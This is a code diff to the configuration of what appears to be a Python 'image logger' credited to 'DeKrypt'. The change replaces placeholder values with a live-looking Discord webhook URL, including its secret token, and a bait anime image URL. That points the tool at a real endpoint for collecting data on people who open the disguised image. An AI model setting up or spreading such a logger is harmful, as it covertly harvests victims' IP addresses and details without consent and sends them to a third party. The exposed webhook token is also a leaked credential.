@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "WEBHOOK HERE !",
-    "image": "IMAGE HERE !", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1445568440650694708/8hTQVYFGpWgyoud5zSzf1q5A4pDvmh_TM7VZNBNNEl698Lc5qowvgarsby38FOMxPVEm",
+    "image": "https://images-wixmp-ed30a86b8c4ca887773594c2.wixmp.com/f/35c4c28f-4df4-4465-8fd5-9360cb3e76d1/dkwewol-8b812e12-32ab-4e8f-977d-bdcb2a885edf.png/v1/fill/w_1194,h_669,q_70,strp/fubuki___one_punch_man_by_stellastria_dkwewol-pre.jpg?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1cm46YXBwOjdlMGQxODg5ODIyNjQzNzNhNWYwZDQxNWVhMGQyNmUwIiwiaXNzIjoidXJuOmFwcDo3ZTBkMTg4OTgyMjY0MzczYTVmMGQ0MTVlYTBkMjZlMCIsIm9iaiI6W1t7ImhlaWdodCI6Ijw9NzE4IiwicGF0aCI6Ii9mLzM1YzRjMjhmLTRkZjQtNDQ2NS04ZmQ1LTkzNjBjYjNlNzZkMS9ka3dld29sLThiODEyZTEyLTMyYWItNGU4Zi05NzdkLWJkY2IyYTg4NWVkZi5wbmciLCJ3aWR0aCI6Ijw9MTI4MCJ9XV0sImF1ZCI6WyJ1cm46c2VydmljZTppbWFnZS5vcGVyYXRpb25zIl19.ZaUufADSa15G7bzToIjeXEcpmlf0Gq6ujpIOoV5CJsk", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
